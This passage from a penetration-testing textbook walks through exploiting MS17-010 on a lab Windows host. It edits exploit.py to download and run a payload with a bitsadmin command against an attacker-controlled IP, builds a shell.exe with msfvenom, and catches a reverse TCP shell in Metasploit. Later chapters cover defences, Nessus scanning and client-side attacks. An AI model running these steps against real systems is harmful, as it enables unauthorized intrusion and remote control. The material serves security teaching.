     
     ![](images/Figure-5.23.jpg)
     
     **Figure 5.23:** Run exploit file
     
     There is an error (No module named `mysmb`) which means that `mysmb` package is not installed. So, we will run the following command to fix this error (see *[Figure 5.24](#c05.xhtml#fig5_24)*):
     
     `wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py`
     
     ![](images/Figure-5.24.jpg)
     
     **Figure 5.24:** Install mysmb module
     
19.  Try running the file again, and we get a different output, as shown in *[Figure 5.25](#c05.xhtml#fig5_25):*
     
     ![](images/Figure-5.25.jpg)
     
     **Figure 5.25:** Run exploit file
     
     It looks like usage information now, which is a good sign. We need to plug in the IP address of our target and a pipe name as parameters.
     
20.  **Find Named Pipe:** Named pipes are a low-overhead technique for running processes to communicate with one another. Pipes are often presented as files to which other processes can attach. A scanner in Metasploit will detect any named pipes on a host. To open a new terminal, type `msfconsole` and then search for the scanner, as shown in *[Figure 5.26](#c05.xhtml#fig5_26):*
     
     `Msfconsole`
     
     `search pipe`
     
     ![](images/Figure-5.26.jpg)
     
     **Figure 5.26:** msfconsole command
     
     The one we want is the `pipe_auditor`. Load the module with the use command.
     
     ` use auxiliary/scanner/smb/pipe_auditor`
     
     You should see the `auxiliary(scanner/smb/pipe_auditor) > options` prompt. Now, we can look at the options, as shown in *[Figure 5.27](#c05.xhtml#fig5_27):*
     
     ![](images/Figure-5.27.jpg)
     
     **Figure 5.27:** msfconsole command\_2
     
     All we really need to do is specify the IP address of our target (`192.168.1.129`) see *[Figure 5.28](#c05.xhtml#fig5_28):*
     
     ![](images/Figure-5.28.jpg)
     
     **Figure 5.28:** msfconsole command\_3
     
     It looks like it no found named pipes.
     
21.  Run the exploit file. We should be able to launch the exploit file at this point. Use the target’s IP address, as shown in *[Figure 5.29](#c05.xhtml#fig5_29)*: 
     
     ![](images/Figure-5.29.jpg)
     
     **Figure 5.29:** Exploit output
     
     So that was successful! We do not know if the file was generated because it is on the system rather than on the SMB share. As a result, we will need to change the exploit. We must first build a `shell.exe` file, as shown in *[Figure 5.30](#c05.xhtml#fig5_30):*
     
     ![](images/Figure-5.30.jpg)
     
     **Figure 5.30:** msfvenom command
     
     Now, we can start the Apache server so the exploit can connect to our machine from the target to reach the payload. Next, we will tweak the code to fit our needs.
     
     ` sudo systemctl start apache2`
     
22.  **Modify the code**: Back in `exploit.py`, find the section of code near the bottom that looks like as shown in *[Figure 5.31](#c05.xhtml#fig5_31)*: 
     
     ![](images/Figure-5.31.jpg)
     
     **Figure 5.31:** Modify exploit file
     
     Here, we can see the code that is responsible for connecting to the target and creating the text file. We can also see an interesting-looking function called `service_exec()` which is commented out. That will connect to the target and issue a command to copy the previously created text file into a new text file named `pwned_exec.txt` on the `C` drive. We can use this function to grab our payload and execute it on the target.
     
     First, uncomment the function and replace everything after cmd `/c` with the following command:
     
     `bitsadmin /transfer pwn /download http://192.168.1.128/sc.exe C:\sc.exe`
     
     **Background Intelligent Transfer Service** (**BITSAdmin**) is a Windows command-line tool used to upload or download files. The `/transfer` switch initializes a transfer (with the name `pwn` in this case), and `/download` specifies that it is a download. Then, we enter the name of the remote file (being hosted on our machine) and the name of the local file once it is transferred.
     
     Next, add another `service_exec()` function and have it execute the file we just transferred. The code will look like this:
     
     `service_exec(conn, r’cmd /c /sc.exe’)`
     
     Finally, we can comment on the section that creates a text file because we really do not need it anymore. The final code should look like as shown in *[Figure 5.32](#c05.xhtml#fig5_32)*:
     
     ![](images/Figure-5.32.jpg)
     
     **Figure 5.32:** Final exploit file after modifying the code
     
     Now, all we have left to do now is run the exploit.
     
23.  **Run the finished exploit**: To complete the exploit, we need something to catch the shell once the payload executes. We can use the multipurpose handler in Metasploit for this. In a new terminal, use the following commands: 
     
     ` msfconsole`
     
     ` use exploit/multi/handler`
     
     You should see the `exploit(multi/handler)` prompt. We just need to set the payload to match whatever we specified when we created the shellcode earlier, which in this case, is a reverse TCP shell.
     
     `set payload windows/shell/reverse_tcp`
     
     `Next, set the appropriate listening host:`
     
     `set lhost 192.168.1.128`
     
     `And the listening port:`
     
     `set lport 9001`
     
     And we can start the handler:
     
     ` Run`
     
     The output of the commands we entered previously can be seen in *[Figure 5.33](#c05.xhtml#fig5_33):*
     
     ![](images/Figure-5.33.jpg)
     
     **Figure 5.33:** msfconsole commands
     
     It will listen for any incoming connections, and if everything goes smoothly, we will get a Meterpreter session once our exploit completes.
     
     Finally, we should have everything in place and ready to go. We can launch the exploit just like we did earlier in our test run from within the exploit directory, as shown in *[Figure 5.34](#c05.xhtml#fig5_34):*
     
     ` python exploit.py 192.168.1.129`
     
     ![](images/Figure-5.34.jpg)
     
     **Figure 5.34:** Run exploit
     
     This time we should see different results. Ignore the errors, and if it does not work the first time, just try again. Once the exploit successfully completes, we should see a session open back on our listener, as shown in *[Figure 5.35](#c05.xhtml#fig5_35):*
     
     ![](images/Figure-5.35.jpg)
     
     **Figure 5.35:** msfconsole output
     
     We can verify we have compromised the target with the `whoami` command, as shown in *[Figure 5.36](#c05.xhtml#fig5_36)*:
     
     ![](images/Figure-5.36.jpg)
     
     **Figure 5.36:** whoami command output
     

Congratulations! Over a wireless network, we were able to detect and exploit a susceptible host.

# [Preventing against threats](#toc.xhtml#s94a)

We must always be aware of how to defend ourselves against these threats and attacks. After that, we will go over how to defend ourselves against these attacks.

# [Prevention identification of hosts](#toc.xhtml#s95a)

Small and large enterprises should have a hardware firewall, such as the WatchGuard XTM, Cisco ASA, or Next Generation Firewalls such as FortiGate, Palo Alto, and Checkpoint, with custom rules to block services and ports that are not in use to protect themselves from threats and dangers. To prevent unwanted access, services that are not in use should be disabled on the server or network device. Intrusion detection systems with SMS or e-mail alerting capabilities. Protocols should be logged, and alerts should be flagged by the firewall.

How would you know if your organization has been hacked if the firewall or IDS is not being monitored? It is critical to monitor your network daily if you want to keep ahead of threats and problems. VLANs can be used to separate your networks. To keep the network safe from network viruses and compromise, each server, workstation, VoIP, and wireless device should have its own VLAN.

# [Preventing others from determining your network size](#toc.xhtml#s96a)

Any sensitive information, including network diagrams, passwords, logs, workstation and server information, and configuration settings, should always be encrypted when evaluating network size. Small and large enterprises can use a hardware firewall such WatchGuard XTM or Cisco ASA to regulate traffic by blocking ICMP and only permitting traffic from trusted sources.

# [Protection of vulnerable hosts](#toc.xhtml#s97a)

Install the latest security updates offered by your vendors to safeguard your computers and network devices from exploitation. When new operating systems and software updates become available, install them. If you run into problems while upgrading, contact your program vendor. Use the most secure Wi-Fi encryption, WPA2 or WPA3, which uses the AES encryption technique and a long password. On all your workstations and servers, run a real-time antivirus scanner with the most recent virus definitions. Staff members should receive security awareness training.

# [Conclusion](#toc.xhtml#s98a)

Wow! In this chapter, we accomplished three demonstrations! This chapter was a lot of fun and was also quite interesting. Let us look back at what you have learned so far.

We addressed why it is critical to determine the number of live hosts while executing a network penetration test in this chapter. After that, we used Kali Linux to detect hosts on the network. Then, as a penetration tester, we demonstrated how to determine network size and why it is vital to know. We wrapped off the chapter by demonstrating how to use the Nessus vulnerability scanner to find vulnerabilities in Windows 7, as well as a list of possible mitigations.

We will go over how to organize a vulnerability assessment, configure the Nessus vulnerability scanner, run the scanner, and patch vulnerabilities in the following chapter. Let us now get started on the upcoming chapter!

# [Questions](#toc.xhtml#s99a)

1.  Mention the most famous network mapping tools.
2.  How do we determine the network size?
3.  How do we detect vulnerable hosts in your network in detail?
4.  What are the prevention methods to defend ourselves against attacks?

# [CHAPTER 6](#toc.xhtml#c06)

# [Wireless Vulnerability Assessment](#toc.xhtml#c06)

# [Introduction](#toc.xhtml#s100a)

We spoke about how to get on the network and find out who is on it in the previous chapter. In this chapter, we will look at vulnerability assessments, which raises the question: what exactly is a vulnerability assessment?

A vulnerability assessment, also known as vulnerability analysis, is the process through which a security professional uncovers, identifies, and categorizes potential security vulnerabilities (holes) in a computer system, network, or other electronic infrastructure. Vulnerability assessments can also be used to evaluate threats and propose an appropriate countermeasure. When conducting vulnerability assessments, most security experts follow a step-by-step procedure. The following is a typical vulnerability assessment:

*   Identifying and categorizing computer systems and networks
*   Creating a list of the most critical services
*   Identifying each service’s possible security threats
*   Developing a defense strategy to counter potential threats
*   Finding measures to minimize or reduce risk in the event of an attack

If a person or organization discovers a vulnerability, they are liable for it and must notify the vendor. A zero-day vulnerability is one that is discovered as a high-level threat without the vendor being notified. When a vulnerability is not addressed or patched by the developer, a zero-day attack will be prevalent. This is well-known when a vendor’s device or software is no longer supported.

If the threat is modest, the vendor will most likely wait until the next update to release a patch. It all relies on the nature of the threat and what it is capable of. A vulnerability that allows remote executables or, worse, root or administrator rights without authorization should be patched as soon as possible; however, this is not always the case. It is contingent on how the vendor handles such a circumstance. It is possible that the organization will not be able to afford it.

Vulnerability assessments are typically carried out by white hats or trained, ethical hackers; however, black hats will occasionally utilize them for malicious purposes. They can perform vulnerability assessments to learn more about what they can access through someone’s network. Security experts can uncover gaps and provide recommendations and countermeasures to prevent an attack using these approaches to access vulnerabilities.

# [Structure](#toc.xhtml#s101a)

In this chapter, we will discuss the following topics:

*   Planning an assessment
*   Setting up a vulnerability scanner
*   Running a vulnerability scanner
*   Running a Nessus
*   Generating reports
*   Resolving vulnerabilities

# [Objectives](#toc.xhtml#s102a)

In this chapter, you will be able to plan out an assessment, the key components of an assessment, and the step-by-step process of an assessment. You will be able to install Nessus, register it, downloaded plugins, and then run Nessus. You will be able to create a new policy and scan, identify vulnerabilities, read the vulnerability details, and follow it with a solution to the vulnerability.

# [Planning an assessment](#toc.xhtml#s103a)

We need to start planning an assessment before we can execute one. We begin by asking ourselves a series of questions about the evaluation. Let us get started!

*How we will be spending our time and resources?*

If you are going to conduct an assessment for an individual or a company, you will need an estimate of how long it will take to complete the task. It is also a good idea to know ahead of time what you will be using to complete the assessment.

*Do you have enough supporting evidence for your discoveries?*

It is a good idea to double-check that you have adequate data to cover any findings you make throughout the vulnerability assessment. When you start generating reports, you need to know what each vulnerability is and how it operates. It is also a good idea to provide proof of concept.

*When a vulnerability is detected and identified, what is the best way to address the problem?*

This is a difficult question to answer because it is dependent on the severity of the threat. The most frequent things to do are to make sure you have the most recent updates, upgrade your software, turn off any background services that are not in use, and add any additional security features like complex passwords and two-factor authentication. Notify the vendor of the vulnerability.

*How can we improve the detection rate and minimize security threats?*

Commercial hardware firewalls with IDS and IPS monitoring capabilities—proactive scanners that detect attacks on the go. Within their hardware firewalls and unified threat management systems, WatchGuard delivers great security modules such as packet filtering, intrusion prevention service, application control, Web blocker, gateway antivirus, spam blocker, and much more. To minimize risk, make sure your software and hardware are always up to date.

An objective and a logical plan are required to conduct a good assessment.

# [Components of a vulnerability assessment plan](#toc.xhtml#s104a)

We will go through a few critical elements of a vulnerability assessment strategy. As an example, consider the following:

*   **Primary objective:** 
    *   How is this objective handled?
    *   How will this objective be accessed?
    *   Who is involved in the assessment?
    *   Whose patches are available on the vendor side?
    *   Identifying common vulnerabilities
    *   Summarize
*   **First objective:** 
    *   Identifies the issues
*   **Second objective:** 
    *   Provide a temporary or permanent solution
*   **Third, fourth, and so on:** 
    *   Depending on the situation, it may require additional objectives.

# [Planning the process of a vulnerability assessment](#toc.xhtml#s105a)

We will look at an example of how to plan a vulnerability assessment in this section:

*   **Objectives:** 
    *   Are there any open networks available? If so, what are they used for?
*   **Criteria:** 
    *   What is the priority of this objective?
*   **Strategy:** 
    *   If there are unauthorized users on the network, can they cause damage to workstations or servers?
    *   Are they on a separate VLAN or subnet?
*   **Methods:** 
    *   What can we do to meet the objective?
*   **Time:** 
    *   Is there a deadline?
    *   When can we provide a solution?
*   **Results:** 
    *   Who will need to know about the results?
    *   How can we prevent future unauthorized user access?

This should give you a fair understanding of how to go about designing your own vulnerability analysis. When providing service to an individual or a business, use this as a guide. After that, we will build up a vulnerability scanner. Nessus is the vulnerability scanner we will be looking at.

Before we begin setting up a vulnerability scanner, it is crucial to understand what a vulnerability scanner is and why it is so important. Vulnerability scanners do exactly what they say on the tin. It is a program or software security tool that looks for flaws in computers, devices, and networks. In most circumstances, it will immediately notify you whether you are facing low, medium, or severe security dangers. From the perspective of a security specialist, this can be highly useful in further analyzing what could potentially threaten an individual or company.

By exploiting the given vulnerability, a black hat hacker might swiftly acquire unauthorized access to confidential information or company data if they use this tool. On a corporate network, the only way to protect against a vulnerability scanner is to divide each department into VLANs, enforce strong group policies that prevent untrusted executables and installations, limit the use of flash drives, and provide any form of protection against running unauthorized programs. Employees should only run products that help them complete their tasks; websites can swiftly shut down those users by enabling a URL blocker and adding security features.

It is crucial to know what a vulnerability scanner is. This is because this tool may be extremely useful in determining what might be a backdoor to your system or perhaps your entire network if a hardware firewall has a service or port open that should not have been switched on in the first place. Firewall and router default settings are excellent because they just work, right? Wrong! It is critical to turn off any unused services and to block any ports that are not in use, such as FTP, RDP, SSH, and Telnet.

Within Kali Linux, we will be using the Nessus vulnerability scanner. Tenable Network Security created Nessus, a proprietary comprehensive vulnerability scanner. They sell both personal and commercial software licenses. For demos, we will use the personal version.

One of the most widely used vulnerability scanners is Nessus. It is currently used by over 80,000 organizations all around the world. Nessus is a tool that automatically detects known security flaws. One of the best features of Nessus is that it can be used as both a client and a server. It can be networked, allowing scans to be performed from any location. Microsoft Windows, Mac OS X, Linux, FreeBSD, Solaris, and IBM/AIX are all supported. For penetration testers, the reporting feature is quite useful.

The following will be detected by Nessus:

*   Vulnerabilities that provide remote access
*   Access to sensitive data on a system
*   Misconfigured systems (missing security patches, open ports, and so on)
*   Commonly used passwords, default passwords, and blank passwords
*   Denial of service attacks by using mangled packet
*   PCI DSS audits

It will not only discover flaws but also give you information on the vulnerability and the severity of the danger. It will include connections to additional information and, if a security patch is available, links to download these security patches to help provide an extra layer of security.

# [Setting up a vulnerability scanner](#toc.xhtml#s106a)

Nessus will be the topic of this section. We will download and install Nessus, then register for an activation code, activate the program, and execute our first scan.

# [Downloading Nessus](#toc.xhtml#s107a)

Because Nessus is not preinstalled on Kali Linux, we will need to download and install it before we can begin searching for vulnerabilities. To get the most recent version of Nessus, go to the following website: **[https://www.tenable.com/downloads/nessus](https://www.tenable.com/downloads/nessus)**

Select the download according to your operating system, as shown in *[Figure 6.1](#c06.xhtml#fig6_1)*:

![](images/Figure-6.1.jpg)

**Figure 6.1:** Nessus download

# [Installing Nessus](#toc.xhtml#s108a)

We will deploy the Nessus vulnerability scanner in this demonstration. The steps are as follows:

1.  Open a Terminal.
2.  Enter the following command and press *Enter*: 
    
    `sudo dpkg -i Nessus-8.15.2-debian6_amd64.deb (For 64 bit OS)`
    
    `sudo dpkg -i Nessus-8.15.2-debian6_i386.deb (For 32 bit OS)`
    
    *[Figure 6.2](#c06.xhtml#fig6_2)* is the output:
    
    ![](images/Figure-6.2.jpg)
    
    **Figure 6.2:** Nessus Download\_2
    
3.  Press *Enter* after entering the following command: 
    
    ` sudo systemctl start nessusd.service`
    
    The Nessus vulnerability scanning utility will be launched with this command, as shown in *[Figure 6.3](#c06.xhtml#fig6_3):*
    
    ![](images/Figure-6.3.jpg)
    
    **Figure 6.3:** Nessus start
    
4.  Navigate to `https://127.0.0.1:8834` in a Web browser.
5.  Click `Proceed` anyhow when presented with the site’s security certificate. We will be present with a screen that is shown in *[Figure 6.4](#c06.xhtml#fig6_4)*: 
    
    ![](images/Figure-6.4.jpg)
    
    **Figure 6.4:** Open Nessus in the Web browser
    
6.  You will be presented with the initialized screen for Nessus, as shown in *[Figure 6.5](#c06.xhtml#fig6_5)*: 
    
    ![](images/Figure-6.5.jpg)
    
    **Figure 6.5:** Initialize Nessus
    
7.  Obtaining an Activation Code for Nessus Vulnerability Scanner 
    
    Nessus Essentials and Nessus Professional are two different versions of enable’s Nessus Vulnerability Scanner. Nessus Essentials is free, although it has a limited feature set compared to Nessus Professional, which costs money. The following are some of the most significant limitations of Nessus Essentials:
    
    *   Scanning is limited to 16 IP Addresses per scanner.
    *   Compliance checks or live results are not available.
    *   No ability to use the Nessus virtual appliance.
    
    Nessus Essentials will be used. Despite the fact that the software is free, it does require a valid activation code, which is detailed as follows.
    
8.  Navigate to the Nessus Essentials Product Portal. 
    
    **[https://www.tenable.com/products/nessus/nessus-essentials](https://www.tenable.com/products/nessus/nessus-essentials)**
    
9.  Fill in your first name, last name, and e-mail address on the registration form, as shown in *[Figure 6.6](#c06.xhtml#fig6_6):*
    
    ![](images/Figure-6.6.jpg)
    
    **Figure 6.6:** Tenable Nessus essentials product registration page
    
10.  To finish registration, click the `Register` button, as shown in *[Figure 6.7](#c06.xhtml#fig6_7):*
     
     ![](images/Figure-6.7.jpg)
     
     **Figure 6.7:** Completing registration on the Tenable Nessus essentials product registration page
     
11.  Tenable will send you a confirmation e-mail once your registration is complete. Finally, you will be given the following message, as shown in *[Figure 6.8](#c06.xhtml#fig6_8)*: 
     
     ![](images/Figure-6.8.jpg)
     
     **Figure 6.8:** The Nessus Essentials product registration page showing the result of successful registration
     
12.  Check your e-mail for an activation code that looks something like D234-C7CB-04AF-79A6-1555. **no-reply@tenable.com** will be the e-mail sender’s address. If you do not see the registration e-mail in your inbox, then check your trash mail!
13.  Activating the Nessus Application: It is time to activate your Nessus installation now that you have gotten your activation code and started the Nessus service.
14.  Navigate to `https://localhost:8834` using a Web browser on your Kali Linux operating system. It is important to note that the default port is `8834`, not `443`. (When you try to visit the Nessus application’s Web interface, you will probably get a warning because the installation comes with a self-signed SSL certificate. Tenable gives you the option of customizing the SSL certificate that your Nessus application uses.)
15.  Select Nessus essentials as the product version on the Welcome to Nessus screen, as shown in *[Figure 6.9](#c06.xhtml#fig6_9)*: 
     
     ![](images/Figure-6.9.jpg)
     
     **Figure 6.9:** Selecting Nessus essentials as the Nessus product version
     
16.  You can skip the `Get an activation code` screen because you already have the activation. Refer to *[Figure 6.10](#c06.xhtml#fig6_10)*: 
     
     ![](images/Figure-6.10.jpg)
     
     **Figure 6.10:** Selecting the skip button on the retrieve activation code screen
     
17.  On the `Register Nessus` screen, enter the `Activation Code` you obtained during the registration procedure and click `Continue`. The mock activation code for this tutorial is `D234-C7CB-04AF-79A6-1555`, as shown in *[Figure 6.11](#c06.xhtml#fig6_11)*: 
     
     ![](images/Figure-6.11.jpg)
     
     **Figure 6.11:** Entering the activation code into the Nessus application
     
18.  When the `Create a user account` screen appears, enter a username and password, then click `Submit`. The Nessus program is accessed using the given login and password, as shown in *[Figure 6.12](#c06.xhtml#fig6_12)*: 
     
     ![](images/Figure-6.12.jpg)
     
     **Figure 6.12:** Creating a user account for the Nessus application
     
19.  After the scanner has finished initializing, which may take some time, click `Sign In` and enter the username and password for the user account you created earlier in this lesson. Refer to *[Figure 6.13](#c06.xhtml#fig6_13)*: 
     
     ![](images/Figure-6.13.jpg)
     
     **Figure 6.13:** Displaying the username and password login screen
     

Fantastic work! Your Nessus vulnerability scanner program is now installed and activated! In the next part, you will set up Nessus to run a vulnerability scan on your local system.

# [Running a Nessus vulnerability scan](#toc.xhtml#s109a)

You have successfully installed Nessus. It is time to put the pedal to the metal and discover what this useful tool can do for you in terms of finding weaknesses! The rest of this section will walk you through configuring and running a scan on your Kali Linux system.

If you are still on the Nessus application screen or are not already logged in, enter the username and password for the user account you created earlier in this guide.

A welcome message may appear upon the first login, allowing you to rapidly configure a discovery scan, which locates networked devices. You may dismiss this notice because you are about to configure and run a custom scan, as shown in *[Figure 6.14](#c06.xhtml#fig6_14)*:

![](images/Figure-6.14.jpg)

**Figure 6.14:** The Nessus application showing the close selection button highlighted

Configuring a scan can be done in a variety of ways. This tutorial focuses on the three-step process mentioned in the following sections.

1.  Configure a scan policy
2.  Configure a scan
3.  Launch the scan

# [Configuring a Nessus vulnerability scan policy](#toc.xhtml#s110a)

Scan policies are basically a set of scanning instructions. Scan policies tell the scanner what duties to complete and how to complete them. You can choose from several pre-configured scan policy templates or customize a complex scan. The scanning capabilities of Nessus are divided into three categories by Tenable:

*   **Discovery scan**: Targets address space to report on live hosts and open ports.
*   **Vulnerability scan**: Targets endpoints to assess for known vulnerabilities.
*   **Compliance scan**: Targets endpoints to assess endpoint configuration for compliance with a particular standard (for example, **Centre for Internet Security (CIS) benchmarks**, **Security Technical Implementation Guide (STIG)**, and so on).

Follow the following steps to build and configure your scan policy.

1.  `Policies` can be found under the `Resources` category in the menu on the left-hand side of the screen, as shown in *[Figure 6.15](#c06.xhtml#fig6_15)*: 
    
    ![](images/Figure-6.15.jpg)
    
    **Figure 6.15:** Selecting policies from the Nessus menu
    
2.  Choose `New Policy` from the menu in the upper right corner of the screen, as shown in *[Figure 6.16](#c06.xhtml#fig6_16)*: 
    
    ![](images/Figure-6.16.jpg)
    
    **Figure 6.16:** Creating a new policy from the Nessus policies page
    
3.  Select `Basic Network Scan` from the drop-down menu. `Pre-configured settings` for assessing your Kali Linux server for vulnerabilities are included in the `Basic Network Scan` option, as shown in *[Figure 6.17](#c06.xhtml#fig6_17)*: 
    
    ![](images/Figure-6.17.jpg)
    
    **Figure 6.17:** Selecting the basic network scan from the Nessus policy templates page
    
    Additional adjustable components appear after selecting a scan policy template. For the time being, leave each pre-configured setting in its default state, but feel free to experiment afterwards.
    
4.  Click the `Save` button after giving your scan policy a `Name`. `Basic Network Vulnerability Scan Policy` is the name of the scan policy used in this tutorial, as shown in *[Figure 6.18](#c06.xhtml#fig6_18)*: 
    
    ![](images/Figure-6.18.jpg)
    
    **Figure 6.18:** Entering the policy name and using pre-configured defaults on the Nessus Basic Network Vulnerability scan policy page
    

Tenable requires administrative access to run vulnerability checks (some of which will be demonstrated in this tutorial). Executing a scan without credentials offers insight into externally enumerable vulnerabilities, simulating the perspective of an attacker.

# [Configuring a Nessus vulnerability scan](#toc.xhtml#s111a)

Configuring your scan is the next stage in the procedure. Select a scan policy and target host as stated as follows during this part of the process.

1.  From the menu on the left-hand side of the screen, select `My Scans`, as shown in *[Figure 6.19](#c06.xhtml#fig6_19)*: 
    
    ![](images/Figure-6.19.jpg)
    
    **Figure 6.19:** Selecting My Scans on the Nessus menu
    
2.  In the upper right-hand corner of the screen, click the `New Scan` button, as shown in *[Figure 6.20](#c06.xhtml#fig6_20):*
    
    ![](images/Figure-6.20.jpg)
    
    **Figure 6.20:** Creating a New Scan in Nessus
    
3.  Select the newly created `Basic Network Vulnerability Scan` from the `User Defined` tab, as shown in *[Figure 6.21](#c06.xhtml#fig6_21):* 
    
    ![](images/Figure-6.21.jpg)
    
    **Figure 6.21:** Choosing to create a User-Defined Nessus scan
    
4.  Choose the scan policy you set up in the previous section. The `Basic Network Vulnerability Scan Policy` from this lesson is displayed for selection, as shown in *[Figure 6.22](#c06.xhtml#fig6_22):*
    
    ![](images/Figure-6.22.jpg)
    
    **Figure 6.22:** Selecting the Basic Network Vulnerability Scan Policy
    
5.  Define your goal(s). In the `Targets` text entry box, type localhost to target your local Kali Linux host, as shown in *[Figure 6.23](#c06.xhtml#fig6_23)*: 
    
    ![](images/Figure-6.23.jpg)
    
    **Figure 6.23:** Defining a vulnerability scan target
    
    Multiple targets can be defined in a single scan by separating them with a comma. Specifying localhost, `10.10.10.10`, for example, will target your localhost and the `10.10.10.10` IP address.
    
6.  Give your scan a name, and then click the `Save` button. The name of this tutorial’s scan is `Basic Network Vulnerability Scan`, as shown in *[Figure 6.24](#c06.xhtml#fig6_24)*: 
    
    ![](images/Figure-6.24.jpg)
    
    **Figure 6.24:** Saving the new Nessus vulnerability scan
    

# [Launching a Nessus vulnerability scan](#toc.xhtml#s112a)

Create an entry in the `My Scans` section of the Nessus application after saving your scan.

1.  Click the `Play` button next to the `Basic Network Vulnerability Scan` to begin your scan, as shown in *[Figure 6.25](#c06.xhtml#fig6_25):*
    
    ![](images/Figure-6.25.jpg)
    
    **Figure 6.25:** Playing a Nessus vulnerability scan
    
2.  The scanning is shown by the rotating green arrow indicator. Be patient as the scan takes some time to complete, as shown in *[Figure 6.26](#c06.xhtml#fig6_26):*
    
    ![](images/Figure-6.26.jpg)
    
    **Figure 6.26:** Demonstrating that a rotating green arrow icon indicates a running scan
    
3.  The scan is complete when the rotating green arrow icon turns to a green checkmark. To see the results, simply click on the scan’s name! Refer to *[Figure 6.27](#c06.xhtml#fig6_27):*
    
    ![](images/Figure-6.27.jpg)
    
    **Figure 6.27:** Completing a vulnerability scan as indicated by the green checkmark
    
    Fantastic work! You have just completed a vulnerability scan on your Kali Linux host! On the scan summary page, click the `Vulnerabilities` tab to see the results, as shown in *[Figure 6.28](#c06.xhtml#fig6_28):*
    
    ![](images/Figure-6.28.jpg)
    
    **Figure 6.28:** Displaying the found vulnerabilities on the scan summary page
    
4.  Click on one of the vulnerabilities. It will provide additional information, as shown in *[Figure 6.29](#c06.xhtml#fig6_29):*
    
    ![](images/Figure-6.29.jpg)
    
    **Figure 6.29:** Displaying additional information on the vulnerabilities
    

The report explains what vulnerability is and what it accomplishes. It will offer a solution along with references to more resources. For the ordinary user, this will provide you with all the information you need to figure out what is causing the problem, what the risks and threats are, and how to fix them.

# [Generating reports](#toc.xhtml#s113a)

Creating reports will help you organize your work and provide you with a central location to analyze all your outputs and results during your penetration test. Reports are useful because they provide all the information in one place, eliminating the need to resort to another document.

1.  It is time to get the reports from our scan now that we have installed and executed it. Click `Vulnerabilities`, as shown in *[Figure 6.30](#c06.xhtml#fig6_30)*: 
    
    ![](images/Figure-6.30.jpg)
    
    **Figure 6.30:** The vulnerabilities
    
2.  Click on `Report`, as shown in *[Figure 6.31](#c06.xhtml#fig6_31):*
    
    ![](images/Figure-6.31.jpg)
    
    **Figure 6.31:** Report
    
3.  Select the file format (PDF/HTML/CSV) and select a `Report Template`, then click on the `Generate Report` button (this will download the file format that you have chosen).
4.  Open the file to see whether it is in a viewable and working format, as shown in *[Figure 6.32](#c06.xhtml#fig6_32)*: 
    
    ![](images/Figure-6.32.jpg)
    
    **Figure 6.32:** Pdf report
    

Congratulations, you have successfully generated a vulnerability report in Nessus!

# [Resolving vulnerabilities](#toc.xhtml#s114a)

Because hackers rarely target software vulnerabilities, they are less harmful than operating system flaws. Even so, some program flaws, such as those in Internet Explorer or Microsoft Office, can constitute a significant hazard. As soon as a patch is released, these vulnerabilities are routinely fixed through Windows updates. Microsoft Update, Windows Update, and Office Update all provide security upgrades. You may simply find them by searching for *security update* as a keyword. If Nessus has identified MS07 036 as a vulnerability on your Windows system, for example, you can search for that security bulletin number and then download all available updates to patch your machine. When it comes to program vulnerabilities, you should always check for and download the most recent software upgrades as soon as they become available.

# [Conclusion](#toc.xhtml#s115a)

That is pretty much it for this chapter! We talked about how to start designing an assessment, the important components of an assessment, and the assessment’s step-by-step approach. Nessus was installed, registered, and plugins were downloaded before Nessus was run. We also built a new policy and scan, detected vulnerabilities, read the vulnerability details, and followed up with a fix. We will now move on to the next chapter, where you will learn about client-side attacks!

# [Questions](#toc.xhtml#s116a)

1.  Mention the steps of installing the Nessus program.
2.  What are the differences between discovery scan and vulnerability scan?
3.  How to generate a report in the Nessus program?

# [CHAPTER 7](#toc.xhtml#c07)

# [Client-side Attacks](#toc.xhtml#c07)

# [Introduction](#toc.xhtml#s117a)

We reviewed how to do a network vulnerability assessment in the previous chapter. Client-side assaults will be covered in this chapter, which will help you understand how hackers might target and attack systems and other network devices. What is a client-side attack, exactly? Let us discuss this.

# [Structure](#toc.xhtml#s118a)

The following topics will be covered in this chapter:

*   How do client-side attacks work?
*   Types of client-side attacks
*   Sniffing unencrypted traffic
*   Honeypot attacking
*   Preventing threats

# [Objectives](#toc.xhtml#s119a)

In this chapter, you will learn how to capture unencrypted traffic and gain an understanding of honeypot attacks and methods, Karmetasploit, Jasager, and prevention from threats.

# [How do client-side attacks work?](#toc.xhtml#s120a)

To completely comprehend how a client-side assault operates, we must first examine how server-side attacks differ from client-side attacks. Clients connect with servers through a variety of apps and services, as shown in *[Figure 7.1](#c07.xhtml#fig7_1)*. These server services are available to the client who has made the service available to them to try and exploit. A server becomes increasingly vulnerable to attacks as more services are launched on it:

![](images/Figure-7.1.jpg)

**Figure 7.1:** Client-side attacks

Client-side attacks are distinct from server-side attacks. These attacks are designed to exploit flaws in client apps that interface with a hostile server. Because it does not process anything sent from a server, the client is not at risk if it is not connected to one. Because most clients are automatically configured to connect to the server, instant messaging applications can possibly expose a client to attacks, as shown in *[Figure 7.2](#c07.xhtml#fig7_2):*

![](images/Figure-7.2.jpg)

**Figure 7.2:** Client-side attacks scenario\_1

The most common client-side attacks are carried out when someone visits a malicious Web page that targets their Web browser application. If the attack is successful, the attacker could easily take control of the client. There are more attacks than just Web-based attacks, such as attacks via e-mail, instant messaging, and FTP, as shown in *[Figure 7.3](#c07.xhtml#fig7_3):*

![](images/Figure-7.3.jpg)

**Figure 7.3:** Client-side attacks scenario\_2

Clients are only safeguarded when a defense is provided. Network traffic is restricted by firewalls and proxies to only trusted websites and servers. Packet filtering, intrusion prevention services, and application control are all included in hardware firewalls like WatchGuard’s XTM 800 Series. All your systems and devices are at risk if you do not have a hardware firewall on your network as a business.

# [Types of client-side attacks](#toc.xhtml#s121a)

Client-side attacks take advantage of the user’s trust in the website or server they are visiting, as shown in *[Figure 7.4](#c07.xhtml#fig7_4):*

![](images/Figure-7.4.jpg)

**Figure 7.4:** Client-side attacks example

The following are the most typical types of client-side attacks:

*   **Spoofing:** It is the act of convincing a user that a website or server is real.
*   **Cross-site scripting (XSS):** This allows an attacker to run code in the user’s browser. This attack can be used to hijack a user’s session, launch phishing attacks to steal login credentials, or even embarrass the user with explicit content. This vulnerability affects all online apps. An exploit will often execute on the user’s Web browser application using HTML, JavaScript, VBScript, ActiveX, Java, or Flash, as shown in *[Figure 7.5](#c07.xhtml#fig7_5):*

![](images/Figure-7.5.jpg)

**Figure 7.5:** XSS Scenario

# [Sniffing unencrypted traffic](#toc.xhtml#s122a)

